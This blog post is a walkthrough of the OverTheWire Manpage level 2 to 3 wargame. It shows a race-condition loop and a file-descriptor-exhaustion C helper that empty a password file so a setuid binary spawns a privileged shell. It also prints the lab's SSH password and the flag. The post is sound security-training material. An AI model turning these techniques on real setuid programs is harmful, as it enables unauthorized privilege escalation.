---
date: 2023-10-08 00:00:00 +0700
layout: post-with-comments
title: "OverTheWire Manpage Level 2 → 3 tutorial!!"
permalink: /posts/overTheWire-Manpage-Level-2-to-3/
tags: [overthewire, manpage, walkthrough, ctf, linux, race-condition]
description: "A step by step tutorial for OverTheWire Manpage Level 2 → 3!!"
---

<!-- Scoped styles: only affect this post -->
<style>
  .manpage-nav{display:flex;align-items:center;gap:.75rem;margin:.5rem 0 1.25rem;border-top:1px solid var(--border-color,#3a3a3a);padding-top:.75rem}
  .manpage-nav .nav-left,.manpage-nav .nav-center,.manpage-nav .nav-right{flex:1}
  .manpage-nav .nav-left{text-align:left}
  .manpage-nav .nav-center{text-align:center}
  .manpage-nav .nav-right{text-align:right}
  .manpage-nav a{display:inline-block;padding:.45rem .8rem;border:1px solid var(--border-color,#3a3a3a);border-radius:.6rem;text-decoration:none;line-height:1}
  .manpage-nav a:hover{transform:translateY(-1px)}
  .manpage-nav .disabled{opacity:.55}
  :root[data-theme='light'] .manpage-nav a{border-color:rgba(0,0,0,.15)}
</style>

<nav class="manpage-nav" aria-label="Manpage level navigation">
  <div class="nav-left">
    <a href="{{ '/posts/overTheWire-Manpage-Level-1-to-2/' | relative_url }}">← Previous: Level 1 → 2</a>
  </div>

  <div class="nav-center">
    <a href="https://overthewire.org/wargames/manpage/manpage3.html" target="_blank" rel="noopener">Official (Level 3) ↗</a>
  </div>

  <div class="nav-right">
    <a href="{{ '/posts/overTheWire-Manpage-Level-3-to-4/' | relative_url }}">Next: Level 3 → 4 →</a>
  </div>
</nav>

## Login

Use the **manpage2** account from the previous level:

```bash
ssh manpage2@manpage.labs.overthewire.org -p 2224
# password: ailaifeipu
````

---

## Goal

We are given two binaries: **`/manpage/manpage3`** and **`/manpage/manpage3-reset`**.
The program compares our input against the contents of `/manpage/manpage3_password`.
Normally this file contains 256 random bytes (hard to guess). Our goal is to force the password file into an **empty state** so that providing an empty string matches and we gain a shell.

---

## Given programs

**manpage3**

```c
#define PASS_PATH "/manpage/manpage3_password"

int main() {
    int rfd = open(PASS_PATH, O_RDONLY);
    char buf[256];
    char buf2[256];
    memset(buf, '\0', sizeof buf);
    memset(buf2, '\0', sizeof buf2);
    read(rfd, buf2, sizeof buf);
    fgets(buf, sizeof buf, stdin);

    if(!strcmp(buf, buf2)) {
        printf("Wow, you should play the lottery!\\n");
        setuid(geteuid());
        system("/bin/sh");
    }
    return 0;
}
```

**manpage3-reset**

```c
#define PASS_PATH "/manpage/manpage3_password"

int main() {
    FILE *wf;
    FILE *rf;
    wf = fopen(PASS_PATH,"w");
    rf = fopen("/dev/urandom","r");
    char buf[256];

    fread(buf, 1, sizeof buf, rf);
    fwrite(buf, 1, sizeof buf, wf);
    return 0;
}
```

---

## Approach

We need to make `/manpage/manpage3_password` temporarily empty so that `strcmp("", "") == 0`.

Two possible strategies:

1. **Race condition:**
   Continuously reset the password file with `manpage3-reset` and, at the right moment, run `manpage3` while the file is in a wiped state (before random bytes are written).

2. **File descriptor exhaustion:**
   If `manpage3-reset` fails to open `/dev/urandom` (too many files already open), it writes nothing, leaving an empty password file.

---

## Solution 1: Race Condition

Run an infinite loop to reset quickly:

```bash
while true; do
    /manpage/manpage3-reset
done
```

Then in another terminal, run:

```bash
/manpage/manpage3
```

Provide **Ctrl-D** (EOF = empty string) as input.
After a few tries (2–4 usually), you’ll hit the window where the password file is empty and drop into a shell.

---

## Solution 2: File Descriptor Exhaustion

Write a small C helper that opens many files until the process hits the limit, then execs `manpage3-reset`:

```c
// exhaust.c
#include <unistd.h>
#include <stdio.h>

int main() {
    FILE *f;
    for (int i = 0; i < 1020; ++i) {
        f = fopen("/manpage/manpage3", "r");
    }
    char* argv[] = { "/manpage/manpage3-reset", NULL };
    char* envp[] = { NULL };
    execve("/manpage/manpage3-reset", argv, envp);
}
```

Compile and run:

```bash
cc -o exhaust exhaust.c
./exhaust
```

Now the reset fails to open `/dev/urandom`, so it writes nothing to the password file.
Next run:

```bash
/manpage/manpage3
```

Press **Ctrl-D** → empty string matches → shell spawned.

---

## Flag

Inside the shell you can read the flag. In my run it was:

```
iaceigicie
```

---

## Why this works

* `manpage3-reset` truncates the password file first, then writes random data.
* Race condition: If we catch it right after truncate and before write, the password file is empty.
* FD exhaustion: Prevents opening `/dev/urandom`, so nothing is written → empty password.
* `strcmp("", "")` passes, granting us a privileged shell.

---

## Troubleshooting

* **Timing off (race method):** Keep looping; success is probabilistic.
* **FD exhaustion not working:** Check `ulimit -n` (default \~1024). Adjust loop count accordingly.
* **Empty input issue:** Use **Ctrl-D** to send EOF (not an actual space or newline).

---

**Congrats 🎉** You’re now through **Level 2 → 3** — classic race condition fun!

---

## Thanks for reading!

Until next time — **Otsumachi!!** 💖☄️✨

![Cinema]({{ '/assets/images/advice/cinema.gif' | relative_url }})

